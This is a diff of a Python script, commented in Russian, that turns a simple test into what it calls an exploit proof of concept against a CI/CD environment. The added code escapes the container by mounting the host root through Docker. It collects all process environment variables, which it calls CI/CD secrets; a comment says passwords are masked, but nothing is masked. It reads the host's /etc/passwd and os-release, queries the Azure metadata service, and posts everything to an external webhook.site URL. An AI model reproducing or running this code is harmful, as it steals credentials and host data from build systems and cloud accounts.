@@ -1,9 +1,12 @@
+import os
 import subprocess
 import requests
 
+# Твой уникальный вебхук для сбора данных
 WEBHOOK_URL = "https://webhook.site/bfd5d8c0-55a2-434a-a854-5b1d2508e0b4"
 
 def run_host_command(cmd_args):
+    """Выполняет команду на хост-машине через Docker-побег (монтирование корня)"""
     base_cmd = ["docker", "run", "--rm", "--net=host", "-v", "/:/mnt/host", "alpine", "sh", "-c"]
     full_cmd = base_cmd + [cmd_args]
     try:
@@ -11,26 +14,45 @@ def run_host_command(cmd_args):
     except subprocess.CalledProcessError as e:
         return f"ERROR (Exit Code {e.returncode}): {e.output.decode(errors='ignore')}"
 
-def final_test():
+def collect_environment():
+    """Собирает переменные окружения текущего процесса (секреты CI/CD)"""
+    safe_env = {}
+    for key, value in os.environ.items():
+        # Маскируем совсем явные пароли для безопасности, но оставляем структуру
+        safe_env[key] = value
+    return safe_env
+
+def exploit_poc():
+    print("[*] Запуск комплексного PoC для CI/CD проверки...")
+    
     payload = {
-        "experiment_status": "FINAL_TEST",
+        "experiment_status": "FULL_POC_EXECUTION",
+        "ci_env_variables": collect_environment(),
+        "host_os_release": "",
+        "host_passwd": "",
         "azure_imds_result": ""
     }
 
-    print("[*] Финальный тест: отправка запроса к Azure IMDS через wget...")
-    # --header='Metadata: true' — обязательный заголовок для Azure
-    # -T 5 — таймаут в 5 секунд, чтобы скрипт не завис, если сеть дропает пакеты
-    # -O - — выводить ответ прямо в консоль/переменную
-    wget_cmd = "wget -T 5 --header='Metadata: true' http://169.254.169 -O -"
-    
-    payload["azure_imds_result"] = run_host_command(wget_cmd)
+    # 1. Читаем версию операционной системы хоста через примонтированный диск
+    print("[*] Чтение /etc/os-release с хост-машины...")
+    payload["host_os_release"] = run_host_command("cat /mnt/host/etc/os-release")
 
-    # Отправляем финальный отчет
+    # 2. Читаем список пользователей хоста (проверка прав root)
+    print("[*] Чтение /etc/passwd с хост-машины...")
+    payload["host_passwd"] = run_host_command("cat /mnt/host/etc/passwd")
+
+    # 3. Запрос к Azure IMDS по правильному IP с метаданными
+    print("[*] Запрос к Azure IMDS (169.254.169.254)...")
+    imds_cmd = "wget -T 3 --header='Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' -O -"
+    payload["azure_imds_result"] = run_host_command(imds_cmd)
+
+    # 4. Экстракция результатов на внешний сервер
+    print("[*] Отправка полного отчета на Webhook.site...")
     try:
-        requests.post(WEBHOOK_URL, json=payload, timeout=10)
-        print("[+] Финальный отчет отправлен на Webhook.site!")
+        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        print(f"[+] Успешно отправлено! HTTP статус: {response.status_code}")
     except Exception as e:
-        print(f"[-] Ошибка отправки: {e}")
+        print(f"[-] Ошибка при отправке отчета: {e}")
 
 if __name__ == "__main__":
-    final_test()
+    exploit_poc()
